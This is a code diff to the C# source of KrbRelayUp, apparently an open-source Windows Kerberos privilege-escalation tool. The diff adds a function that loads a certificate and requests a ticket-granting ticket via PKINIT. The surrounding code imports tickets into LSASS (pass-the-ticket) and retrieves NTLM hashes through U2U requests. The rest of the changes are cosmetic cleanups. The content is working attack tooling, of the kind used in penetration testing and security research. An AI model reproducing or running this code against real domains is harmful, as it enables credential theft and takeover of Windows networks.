@@ -4,9 +4,9 @@ using KrbRelayUp.Kerberos;
 using KrbRelayUp.Kerberos.PAC;
 using KrbRelayUp.lib.Interop;
 using System;
-using System.Collections.Generic;
+using System.IO;
 using System.Linq;
-using System.Text;
+using System.Security.Cryptography.X509Certificates;
 
 namespace KrbRelayUp
 {
@@ -59,6 +59,49 @@ namespace KrbRelayUp
                 Console.WriteLine("\r\n" + ex.Message + "\r\n");
             }
             Environment.Exit(0);
+            return null;
+        }
+
+        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false, string proxyUrl = null)
+        {
+            try
+            {
+                X509Certificate2 cert = null;
+
+                if (Helpers.IsBase64String(certFile))
+                {
+                    cert = new X509Certificate2(Convert.FromBase64String(certFile), certPass);
+                }
+                else if (File.Exists(certFile))
+                {
+                    cert = new X509Certificate2(File.ReadAllBytes(certFile), certPass);
+                }
+
+                if (cert == null)
+                {
+                    Console.WriteLine("[-] Failed to load certificate");
+                    return null;
+                }
+
+                KDCKeyAgreement agreement = new KDCKeyAgreement();
+
+                Console.WriteLine("[+] Using PKINIT with etype {0} and subject: {1} ", etype, cert.Subject);
+                Console.WriteLine("[+] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);
+
+                AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts);
+                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials, proxyUrl);
+
+            }
+            catch (KerberosErrorException ex)
+            {
+                KRB_ERROR error = ex.krbError;
+                Console.WriteLine("[-] KRB-ERROR ({0}) : {1}", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+            }
+            catch (KrbRelayUpException ex)
+            {
+                Console.WriteLine("[-] " + ex.Message);
+            }
+
             return null;
         }
 
@@ -135,7 +178,7 @@ namespace KrbRelayUp
             {
                 // generate the decryption key using Diffie Hellman shared secret 
                 PA_PK_AS_REP pkAsRep = (PA_PK_AS_REP)rep.padata[0].value;
-                key = pkAsReq.Agreement.GenerateKey(pkAsRep.DHRepInfo.KDCDHKeyInfo.SubjectPublicKey.DepadLeft(), new byte[0],
+                key = pkAsReq.Agreement.GenerateKey(pkAsRep.DHRepInfo.KDCDHKeyInfo.SubjectPublicKey.DepadLeft(), Array.Empty<byte>(),
                     pkAsRep.DHRepInfo.ServerDHNonce, GetKeySize(etype));
             }
             else
@@ -147,7 +190,7 @@ namespace KrbRelayUp
             if (rep.enc_part.etype != (int)etype)
             {
                 // maybe this should be a fatal error instead of just a warning?
-                Console.WriteLine($"[!] Warning: Supplied encyption key type is {etype} but AS-REP contains data encrypted with {(Interop.KERB_ETYPE)rep.enc_part.etype}");
+                Console.WriteLine($"[!] Warning: Supplied encryption key type is {etype} but AS-REP contains data encrypted with {(Interop.KERB_ETYPE)rep.enc_part.etype}");
             }
 
             // decrypt the enc_part containing the session key/etc.
@@ -257,12 +300,12 @@ namespace KrbRelayUp
                 {
                     if (verbose)
                     {
-                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
+                        Console.WriteLine("\r\n[+] Ticket written to {0}\r\n", outfile);
                     }
                 }
             }
 
-            if (ptt || ((ulong)luid != 0))
+            if (ptt || (luid != 0))
             {
                 // pass-the-ticket -> import into LSASS
                 LSA.ImportTicket(kirbiBytes, luid);
@@ -276,7 +319,7 @@ namespace KrbRelayUp
 
             if (getCredentials)
             {
-                Console.WriteLine("[*] Getting credentials using U2U\r\n");
+                Console.WriteLine("[+] Getting credentials using U2U\r\n");
                 byte[] u2uBytes = TGS_REQ.NewTGSReq(info.pname.name_string[0], info.prealm, info.pname.name_string[0], cred.tickets[0], info.key.keyvalue, (Interop.KERB_ETYPE)info.key.keytype, Interop.KERB_ETYPE.subkey_keymaterial, false, String.Empty, false, false, false, false, cred, "", true);
                 byte[] u2uResponse = Networking.SendBytes(dcIP, 88, u2uBytes);
                 if (u2uResponse == null)
@@ -320,11 +363,11 @@ namespace KrbRelayUp
                                         int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);
                                         if (flags == 3)
                                         {
-                                            hash = String.Format("{0}:{1}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray()), Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
+                                            hash = $"{Helpers.ByteArrayToString(((byte[]) (Array) credData.Credentials).Skip(8).Take(16).ToArray())}:{Helpers.ByteArrayToString(((byte[]) (Array) credData.Credentials).Skip(24).Take(16).ToArray())}";
                                         }
                                         else
                                         {
-                                            hash = String.Format("{0}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
+                                            hash = $"{Helpers.ByteArrayToString(((byte[]) (Array) credData.Credentials).Skip(24).Take(16).ToArray())}";
                                         }
                                     }
                                     else
